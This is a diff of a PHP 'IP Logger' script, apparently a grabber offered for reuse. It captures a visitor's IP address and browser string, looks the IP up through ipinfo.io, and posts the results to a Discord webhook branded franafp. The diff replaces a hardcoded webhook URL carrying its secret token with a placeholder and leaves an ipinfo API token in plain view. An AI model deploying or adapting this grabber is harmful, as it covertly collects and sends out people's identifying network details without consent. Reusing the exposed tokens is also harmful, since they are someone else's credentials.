@@ -2,29 +2,29 @@
 
 $ip = $_SERVER['REMOTE_ADDR']; # 
 $browser = $_SERVER['HTTP_USER_AGENT'];
-$url = "https://discordapp.com/api/webhooks/1058378486106038323/rqZ9LcWjM2tPmcPM2UpUXy5LVYbp0hxmR5vmqQ_O7EcMHlL6fr1Dm0Pgpu_DvzFDfpmF"; # Put your Webhook URL here
+$url = "WEBHOOK_HERE"; # Put your Webhook URL here
 
 
 $ipinfo = file_get_contents("https://ipinfo.io/${ip}?token=6d2a4b25add82e");
 
 $hookObject = json_encode([
-    "username" => "franafp.es | IP Logger ",
-    "avatar_url" => "https://franafp.es/media/kheis.png",
+    "username" => "franafp.com | IP Logger ",
+    "avatar_url" => "https://franafp.com/uploader/cdn/fran.jpeg",
     "tts" => false,
     "embeds" => [
         [
-            "title" => "franafp.es IP LOGGER",
+            "title" => "franafp.com IP LOGGER",
             "type" => "rich",
-            "description" => "You can see more information about the grabber in my [Github](https://franafp.es/github)",
+            "description" => "You can see more information about the IP grabber in [wtp.franafp.com](https://wtp.franafp.com/posts/php-ip-logger)",
             "timestamp" => "1810-01-10T19:12:00-05:00",
             "color" => hexdec( "7800b0" ),
             "footer" => [
                 "text" => "IP Logger fran_afp_#0001 ",
-                "icon_url" => "https://franafp.es/media/kheis.png"
+                "icon_url" => "https://franafp.com/uploader/cdn/fran.jpeg"
             ],
             "author" => [
-                "name" => "franafp.es",
-                "icon_url" => "https://franafp.es/media/kheis.png"
+                "name" => "franafp.com",
+                "icon_url" => "https://franafp.com/uploader/cdn/fran.jpeg"
              ],
 
             "fields" => [
